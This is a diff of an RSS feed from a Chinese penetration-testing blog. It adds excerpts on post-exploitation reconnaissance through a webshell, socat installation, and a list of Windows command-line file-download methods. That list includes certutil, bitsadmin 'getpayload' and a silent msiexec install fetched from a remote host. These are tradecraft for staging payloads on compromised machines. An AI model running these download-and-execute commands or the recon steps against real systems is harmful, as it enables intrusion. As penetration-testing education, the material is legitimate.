 &lt;h2 id="0x01-信息搜集---后渗透">0x01 信息搜集 - 后渗透&lt;/h2>
 &lt;p>首先我们后渗透阶段的开始表现在 拥有一个Webshell或者通过其他漏洞获取了某些操作服务器文件的权限，亦或者能够直接反弹Shell&lt;/p>
@@ -313,7 +523,28 @@
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>socat 使用手册</title><link>https://payloads.online/tools/socat/</link><pubDate>Thu, 09 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/tools/socat/</guid><description>&lt;h2 id="socat简介">socat简介&lt;/h2>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>D:\WWW\***\master\&amp;gt; net user /domain
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>这项请求将在域 WORKGROUP 的域控制器处理。
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>发生系统错误 1355。
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>指定的域不存在，或无法联系。
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>通过上面的结果可以看到该服务器并不是域成员&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>D:\WWW\***\master\&amp;gt; query user
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>* 没有用户
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>没有管理员在线&lt;/p></description></item><item><title>socat 使用手册</title><link>https://payloads.online/tools/socat/</link><pubDate>Thu, 09 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/tools/socat/</guid><description>&lt;h2 id="socat简介">socat简介&lt;/h2>
 &lt;p>socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版，socat的官方网站：http://www.dest-unreach.org/socat/ 。&lt;/p>
 &lt;p>Socat是一个两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、socket（Unix，IP4，IP6 - raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。&lt;/p>
 &lt;p>Socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和 PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。&lt;/p>
@@ -338,7 +569,39 @@
 &lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>Windows下命令行下载文件总结</title><link>https://payloads.online/archivers/2017-11-08/1/</link><pubDate>Wed, 08 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-08/1/</guid><description>&lt;h2 id="0x00-powershell">0x00 Powershell&lt;/h2>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>./configure
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make install
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>具体的细节可以参考安装文档 README 。&lt;/p>
+&lt;h3 id="安装错误解决">安装错误解决&lt;/h3>
+&lt;p>在编译的过程中可能遇到如下错误：&lt;/p>
+&lt;p>解决方法有两种：&lt;/p>
+&lt;ul>
+&lt;li>第一种是禁用fips，使用如下命令配置：&lt;/li>
+&lt;/ul>
+&lt;p>&lt;code>./configure --disable-fips&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>第二种是安装fips&lt;/li>
+&lt;/ul>
+&lt;p>首先到网站http://www.openssl.org/source/ 下载openssl-fips安装包，然后解压安装：&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>./config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make install
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="socat的使用">socat的使用&lt;/h2>
+&lt;p>socat的具体文档参见网站：http://www.dest-unreach.org/socat/doc/socat.html 。&lt;/p></description></item><item><title>Windows下命令行下载文件总结</title><link>https://payloads.online/archivers/2017-11-08/1/</link><pubDate>Wed, 08 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-08/1/</guid><description>&lt;h2 id="0x00-powershell">0x00 Powershell&lt;/h2>
 &lt;p>win2003、winXP不支持&lt;/p>
 &lt;p>$client = new-object System.Net.WebClient&lt;/p>
 &lt;p>$client.DownloadFile(&amp;lsquo;&lt;a href="http://payloads.online/file.tar.gz'">http://payloads.online/file.tar.gz'&lt;/a>, &amp;lsquo;E:\file.tar.gz&amp;rsquo;)&lt;/p>
@@ -354,4 +617,13 @@
 &lt;p>可以参考：http://www.163164.com/jiqiao/163164com011.htm&lt;/p>
 &lt;h2 id="0x03-certutil">0x03 Certutil&lt;/h2>
 &lt;p>可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx&lt;/p>
-&lt;p>应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2&lt;/p></description></item></channel></rss>
+&lt;p>应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2&lt;/p>
+&lt;p>certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt&lt;/p>
+&lt;h2 id="0x04-bitsadmin">0x04 bitsadmin&lt;/h2>
+&lt;p>可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx&lt;/p>
+&lt;ul>
+&lt;li>1、&lt;code>bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt&lt;/code>&lt;/li>
+&lt;li>2、&lt;code>bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="0x05-msiexec">0x05 msiexec&lt;/h2>
+&lt;p>msiexec /q /i http://192.168.3.1/test.txt&lt;/p></description></item></channel></rss>
